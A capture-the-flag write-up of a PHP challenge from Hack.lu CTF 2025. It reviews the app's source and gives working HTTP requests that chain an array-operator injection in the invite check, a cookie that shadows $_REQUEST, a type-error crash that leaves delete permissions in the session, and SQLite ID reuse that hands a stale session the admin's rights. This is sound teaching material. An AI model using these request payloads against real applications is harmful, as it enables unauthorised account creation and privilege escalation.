This is a joint write up between me and my colleague @4v1at0r for Hacklu CTF 2025.

This is a really interesting challenge where amazing teamwork and collaboration allowed us to solve it!

## ToC

- [Registering a user](#registering)
- [The Problem](#the%20problem)
- [Now what?](#now%20what?)
- [Settings](#settings)
- [Putting everything together](#putting%20everything%20together)
- [Exploit](#exploit)

## The code

We are given the src code of this app, and without bothering you too much I'll show you here.

```
├── src
│   ├── art
│   │   ├── BURPSUITVIK.txt
│   │   ├── FLÄGG.txt
│   │   ├── KALIFJORD.txt
│   │   ├── NMAPPAV.txt
│   │   └── WIREHAJ.txt
│   ├── flag.php
│   ├── inc
│   │   ├── db.php
│   │   ├── footer.php
│   │   ├── header.php
│   │   ├── invites.php
│   │   ├── perms.php
│   │   ├── required.php
│   │   ├── users.php
│   │   └── utils.php
│   ├── index.php
│   ├── install.php
│   ├── login.php
│   ├── logout.php
│   ├── register.php
│   ├── settings.php
│   ├── style.css
│   └── tty.css
```


Here is what flag.php looks like:

```php
<?php
include_once 'inc/required.php';
include_once 'inc/perms.php';

enforce_auth();

include_once 'inc/header.php';
if (has_perms('flag_read')) {
    echo '<h2>Flag</h2>';
    echo '<p>Flag: <code>' . getenv('FLAG') . '</code></p>';
} else {
    echo '<h2>Flag</h2>';
    echo '<p>You do not have permission to view the flag.</p>';
}
include_once 'inc/footer.php';
```

So its clear we need to have the `flag_read` permission in order to get the flag.

Let's analyse the /inc/perms.php file:

```php
<?php

include_once 'db.php';

function get_perms() {
    global $db;
    $res = $db->select([
        'SELECT' => ['perm'],
        'FROM' => 'perms',
        'WHERE' => ['uid' => $_SESSION['uid'] ?? -1],
    ]);
    $a = array_map(function($perm) { return $perm['perm']; }, $res);
    foreach ($a as $perm) {
      error_log("perms map" . $perm);
    }
    return array_map(function($perm) { return $perm['perm']; }, $res);
}

function has_perms(...$perms) {
    if (!isset($_SESSION['perms'])) {
      $_SESSION['perms'] = get_perms();
      error_log("PERMS NOT SET, GETTING THEM...");
    }

    foreach ($_SESSION['perms'] as $lol) {
      error_log("ALL PERMS: " . $lol);
    }
    foreach ($perms as $perm) {
        if (!in_array($perm, $_SESSION['perms'], true)) {
          error_log("NOT IN ARRAY: " . $perm);
          return false;
        }
        error_log("You have perms: " . $perm);
    }

    return true;
}

function add_perm($uid, $perm) {
    global $db;
    $db->insert('perms', [
        'uid' => $uid,
        'perm' => $perm,
    ]);
}

function add_tmp_perms(...$perms) {
    $_SESSION['perms'] = array_merge($_SESSION['perms'] ?? [], $perms);
}

function rm_tmp_perms(...$perms) {
    $_SESSION['perms'] = array_diff($_SESSION['perms'] ?? [], $perms);
}

```

The perms are stored on the table `perms` and the `uid` field is used to identify an user's perms by correlating the user id with the perms id.


## Registering

The first thing we had to find out was how to register an user.<br>
The registration PHP code code looks like this:

```php
if (isset($_REQUEST['username']) && isset($_REQUEST['password']) && isset($_REQUEST['code']) && is_string($_REQUEST['code'])) {
    if (is_valid_invite($_POST['code'])) {
        $username = $_POST['username'];
        if (get_user_by_name($username)) {
            show_error('Username already taken.');
        } else {
            add_tmp_perms('users_add');
            $user = create_user($username, $_POST['password']);
            rm_tmp_perms('users_add');
            if ($user) {
                show_success('Account created successfully.');
                header('Location: login.php');
            } else {
                show_error('Failed to create user.');
            }
        }
    } else {
        show_error('Invalid invite code.');
    }
}
```

Here we notice the app checks if the variable `code` is a string by caling `is_string($_REQUEST['code'])`<br>
The app also checks if the given code is valid: `is_valid_invite($_POST['code'])`<br>

Let's check the `is_valid_invite()` function:

```php
function is_valid_invite($code) {
    global $db;
    $res = $db->select([
        'SELECT' => '*',
        'FROM' => 'invites',
        'WHERE' => ['code' => $code],
    ]);
    return count($res) === 1;
}
```
It seems to perform the following query: `SELECT * FROM invites WHERE code = $code`<br>
Maybe we can find a way to perform a SQL injection attack here?

Let's trace it all the way to the custom `$db->select()` function:

```php
    public function select($q) {
        $sql = 'SELECT ';
        $sql .= $q['SELECT'] === '*' ? '*' : implode(', ', array_map(array($this, 'quoteName'), $q['SELECT']));
        if (isset($q['FROM'])) $sql .= ' FROM ' . $this->quoteName($q['FROM']);
        if (isset($q['WHERE'])) $sql .= $this->buildWhere($q['WHERE']);
        return $this->query($sql)->fetchAll() ?? [];
    }

    private function buildWhere($where, $op = 'AND') {
        $sql = '';
        foreach ($where as $name => $value) {
            if (!empty($sql)) {
                $sql .= " $op ";
            }
            if (($name === 'OR') || ($name === 'AND')) {
                $sql .= ' (' . $this->buildWhere($value, $name) . ')';
            } else if ($name === 'NOT') {
                $sql .= ' NOT (' . $this->buildWhere($value) . ')';
            } else {
                $sql .= ' ' . $this->quoteName($name) . $this->buildTerm($value);
            }
        }
        return ' WHERE' . $sql;
    }

    private function buildTerm($term) {
        if (is_array($term)) {
            if (count($term) == 2 && isset($term[0]) && $this->isOperator($term[0])) {
                $comparison = $term[0];
                $criterion_value = $term[1];
            } else {
                return 'IN ' . $this->buildValue($term);
            }
        } else {
            $comparison = '=';
            $criterion_value = $term;
        }
        return " $comparison " . $this->buildValue($criterion_value);
    }

    private function isOperator($operator) {
        return in_array($operator, [
            '=', '!=', '<', '<=', '>', '>=', '<>',
            'LIKE', 'NOT LIKE', 'IN', 'NOT IN',
        ], true);
    }

    private function buildValue($value) {
        if (is_array($value)) {
            foreach ($value as $k => $v) {
                $value[$k] = $this->quoteValue($v);
            }
            return '(' . implode(', ', $value) . ')';
        }
        return $this->quoteValue($value);
    }

    private function quoteName($name) {
        return "`$name`";
    }

    private function quoteValue($value) {
        return $this->conn->quote($value);
    }
}
```

So again, what if the input $code inst a string? Let's look at what happens.

```php
Imagine we call
$db->select([
    'SELECT' => '*',
    'FROM' => 'invites',
    'WHERE' => ['code' => ["LIKE", "%%"]] // instead of 'code' => 'astring'
]);


// The WHERE CLAUSE is built here
// buildTerm(["LIKE", "%%"])
    private function buildTerm($term) {
         if (is_array($term)) { // We hit this !
            if (count($term) == 2 && isset($term[0]) /* LIKE */ && $this->isOperator($term[0]) /* Yes because LIKE is in the operators */) {
                $comparison = $term[0]; /* $comparison = LIKE */
                $criterion_value = $term[1]; /* value = %% */
            } else {
                // default , code IN xyz
                return 'IN ' . $this->buildValue($term);
            }
        } else {
            // default for string WHERE code = 'input'
            $comparison = '=';
            $criterion_value = $term;
        }
        return " $comparison " . $this->buildValue($criterion_value); // just quotes our value ('%%')
        // returns LIKE '%%'
    }

    private function isOperator($operator) {
        return in_array($operator, [
            '=', '!=', '<', '<=', '>', '>=', '<>',
            'LIKE', 'NOT LIKE', 'IN', 'NOT IN',
        ], true);
    }

```

So _in theory_ if we can send an array `['LIKE', '%%']` we create the statement

```SQL
SELECT * FROM invites WHERE code LIKE '%%'
```

**PERFECT** we would manage to register.

At this point I changed the source code to remove the is_String check and send in this request to test.

```http
POST /register.php HTTP/1.1
Host: lvh.me:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://lvh.me:8000
Connection: keep-alive
Referer: http://lvh.me:8000/register.php
Cookie: PHPSESSID=a8aa98f03bcf527e0a144b90d0f87dbf
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=lol&password=hi&code[]=LIKE&code[]=%%
```

And the server does the following:

```SQL
1. SELECT `id`, `username`, `password` FROM `users` WHERE `username` = 'lol' 2-
2. INSERT INTO `users` (`username`, `password`) VALUES ('lol', '$2y$12$wkWuq83HFSAWovB76Z2pe.gmKrZHbeju2btS0h9Tmg59SlhS1JQn.') RETURNING * shop-
```

PERFECT WE GOT IT


## The Problem

We just have 1 **big** problem, the server checks if the introduced `code` is a string.

This is when my colleague [@4v1at0r]( https://www.linkedin.com/in/4v1at0r) comes in and I start showing him my progress.

"The only problem is it doesn't accept arrays, only strings" - I say<br>
"Show me the code" - he says

And he immediately finds the vulnerability:

```php
if (isset($_REQUEST['username']) && isset($_REQUEST['password']) && isset($_REQUEST['code']) && is_string($_REQUEST['code'])) {
    if (is_valid_invite($_POST['code'])) {
```

The app is using `$_REQUEST['code']` on the check and `$_POST['code']` on `is_Valid_invite()`

How could I have missed that !

On PHP the variables in `$_REQUEST` are provided to the script via the GET, POST, and COOKIE input mechanisms, and in this order by default.

So if we inject a code=lol in our cookies and a payload to perform the SQL injection on the code field, we will get something like:

`$_REQUEST['code']` = lol <br>
`$_POST['code']` = `[LIKE, %%]`

So the is_string() check passes, and the SQL Injection happens, lets take a look at the request which contains the payload:

```http
POST /register.php HTTP/1.1
Host: lvh.me:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 31
Origin: http://lvh.me:8000
Connection: keep-alive
Referer: http://lvh.me:8000/register.php
Cookie: PHPSESSID=a8aa98f03bcf527e0a144b90d0f87dbf; code=lol <- !!!
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=lol&password=hi&code[]=LIKE&code[]=%%
```

And it works, the server returns is_string('lol') = true, and injects our code in the POST body allowing us to log in.

## Now what?

We are logged in now what?
- We do not have perms to read the flag
- We can not register as admin
- We cannot set perms
- We cannot inject code to further exploit the SQLi vulnerability


At this point I am stuck so I decide to check if I can use the same SQLi via the array in login, to login as admin. That is when I get this error

```
<br />
<b>Fatal error</b>: Uncaught TypeError: check_user_exists(): Argument #1 ($user) must be of type string, array given, called in /app/login.php on line 17 and defined in /app/inc/users.php:15
Stack trace:
#0 /app/settings.php(17): check_user_exists(Array)
#1 {main}
thrown in <b>/app/inc/required.php</b> on line <b>15</b><br />
```

The program crashes because it enforces this is a string on the function parameters declaration

```php
check_user_exists(string $username) { ... }
```

## Settings

After logging in there were not many functions, we could only logout and visit a settings page.<br>
The settings page allows to delete our user, let's analyse the `settings.php` file:

```php
if (isset($_POST['delete-user'])) {
    $delete_uid = (int) $_REQUEST['uid'];
	// if I have perms = delete any user
    if (has_perms('users_delete', 'perms_delete')) {
        delete_user($delete_uid);
        show_success("User $delete_uid has been deleted.");
    // if not delete only myself
    } elseif ($delete_uid === $_SESSION['uid']) {
	    // adds perms
        add_tmp_perms('users_delete', 'perms_delete');
        delete_user($delete_uid);
        show_success($_REQUEST['msg']);
        // only removes perms here
        rm_tmp_perms('users_delete', 'perms_delete');
        header('Location: logout.php');
    } else {
        show_error('You do not have permission to delete users.');
    }
}
```

After analysing I instantly thought "race condition" if we can make a request as soon as we get perms, we can delete any user, not just ours.

Let's take a look at `show_success()` function:

```php
function show_success(string $success) {
    global $msgs;
    $msgs[] = ['type' => 'success', 'text' => $success];
}
```

Well this is enforcing string just like check_user_exists() did , let's try to crash it.

We send the following POST request, our account uid = 2

```http
POST /settings.php?uid=2&msg[]=HALT. HTTP/1.1
Host: lvh.me:8000
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:143.0) Gecko/20100101 Firefox/143.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://lvh.me:8000
Connection: keep-alive
Referer: http://lvh.me:8000/settings.php
Cookie: PHPSESSID=a8aa98f03bcf527e0a144b90d0f87dbf
Upgrade-Insecure-Requests: 1
Priority: u=0, i

delete-user=Delete+my+account&msg[]=HALT.
```

Looking at logs

```
<br />
<b>Fatal error</b>: Uncaught TypeError: show_success(): Argument #1 ($success) must be of type string, array given, called in /app/settings.php on line 17 and defined in /app/inc/required.php:15
Stack trace:
#0 /app/settings.php(17): show_success(Array)
#1 {main}
thrown in <b>/app/inc/required.php</b> on line <b>15</b><br />
```

So I am given `'users_delete'` and `'perms_delete'` perms. Our user is never removed and never gets logged out. Meaning the **PHP session persists** but the user is no longer registered on the the database.<br>
At this point since I have `'users_delete'` and `'perms_delete'` permissions I can remove any user in the data base by simply calling `/settings.php?uid=X` , deleting user X.


```php
    } elseif ($delete_uid === $_SESSION['uid']) {
       // get perms
	    add_tmp_perms('users_delete', 'perms_delete');
	    // remove us from the user table
	    delete_user($delete_uid);
	    // CRASH
        show_success($_REQUEST['msg']);
        // never reaches here
        rm_tmp_perms('users_delete', 'perms_delete');
        header('Location: logout.php');
```

# Installation script
There is an installation script `install.php` which allows to setup de app the first time we spawn it.<br>
The file contains functions to setup de database, including an interesting function which creates the `admin` user:
```php
...
$db->exec('CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)');
...
if (!get_user_by_name('admin')) {
    $admin_pw = bin2hex(random_bytes(16));
    add_tmp_perms('users_add');
    $admin = create_user('admin', $admin_pw);
    rm_tmp_perms('users_add');
    $uid = $admin['id'];
    add_tmp_perms('perms_add');
    add_perm($uid, 'users_edit');
    add_perm($uid, 'users_delete');
    add_perm($uid, 'perms_edit');
    add_perm($uid, 'perms_delete');
    add_perm($uid, 'flag_read');
    rm_tmp_perms('perms_add');
    error_log("Admin password: $admin_pw");
}
```

We see the script creates the `admin` user if there is no user named `admin` on the database and gives this user some perms including the `read_flag` perms which is exactly the perm we need to get the flag by visiting `flag.php`.

# Putting everything together

This is what we managed to perform so far:
- Register on the app via SQLi
- Manage to delete any user by passing the id we wish to delete
- We are able to call the installation script without needing to be logged in

Is there any way we can exploit the application logic in order to login as an user which has the `read_flag` perm?

# Exploit
After thinking for a while we notice that the if we delete all users in the database `PRIMARY KEY's` has no way to now whats the next id, so it re-generates a user with id = 1<br>

And since the **sessions are not destroyed** when we delete a user, maybe if we delete all users and manage to create the admin user who has **database** id = a previous user's **session** uid, this user's session perms should be acquired from the database where id = **session uid** which is the **ADMIN** meaning he inherits the admin's permission.

We ran a little check locally to verify how SQLite behaves:

![img_sqlite](https://media.discordapp.net/attachments/1429401341716857054/1429559374996570243/Screenshot_2025-10-19_at_20.58.28.png?ex=68f6946a&is=68f542ea&hm=86c012f6638c23280fd6c7857292316c99bd02077b2c7b03f5ad82cab8780985&=&format=webp&quality=lossless&width=1643&height=703)

As we can see, after deleting all the records from the table, the `id` field will start with the value `1` as the table is filled again.

These are the steps we performed to get the flag:
- Register 2 different users by exploiting the previously found SQLi (they will have respectively id of 2 and 3 in the database). The users can be:<br>
    - `eraser` - To erase the database
    - `useful` - To be used later

- Open 2 browser windows and login as `eraser` on one and as `useful` on the other
- **Important:** Do not visit any of the other pages as `useful` after logging in as it may set its permissions on the session making the exploitation impossible
- Now as the `eraser` user delete all the database users by repeating the delete request incrementing the uid from 1 to 3
- The database is now empty
- Now register two dummy users just to fill the first 2 records of the users table, these will have the id 1 and 2 respectively on the database
- Now call the `install.php` as this creates the admin user. As there are already 2 users, the admin is the user which id=3 on the database
- Our `useful` user has **session uid** = 3 when we logged in and the session is valid.
- Visit `/flag.php` with this user
- get_perms() is called with our user's **session uid** , ` ... WHERE id = 3` which is the **admins id on the database**, se he receives all of the admins perms
- He has perm `read_flag` so he receives the flag!
